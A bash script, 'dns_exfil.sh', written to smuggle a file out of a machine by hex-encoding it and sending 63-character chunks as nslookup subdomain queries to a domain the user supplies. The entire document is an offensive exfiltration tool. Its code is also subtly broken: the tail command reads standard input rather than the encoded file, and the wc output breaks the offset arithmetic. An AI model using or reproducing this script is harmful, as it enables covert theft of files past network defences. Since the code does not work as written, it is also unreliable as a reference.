#!/usr/bin/env bash
#
# Usage:
# dns_exfil.sh <domain> <file>
#

usage() {
    echo "Usage:"
    echo "dns_exfil.sh <domain> <file>"
}

if [ $# -ne 2 ]; then
    usage
    exit 1
fi

domain=$1
file=$2
encoded_file=$(base64 /dev/urandom | tr -dc '[:alnum:]' | head -c 20)

if [ -f "$file" ]; then
    echo "[*] exfiltrating file $file"
    hexdump -ve '1/1 "%.2x"' "$file" > $encoded_file.hex
    encoded_bytes=$(wc -c $encoded_file.hex)
    tail_offset=$encoded_bytes
    count=0
    while [ $tail_offset -ge 0 ]; do
        ex=$(tail -c $tail_offset | head -c 63)
        nslookup $ex."$domain"
        tail_offset=$[$tail_offset-63]
    done
    echo "[+] exfiltration done"
    rm $encoded_file.hex

else
    echo "[-] file $file does not exist or is a directory"
    exit 1
fi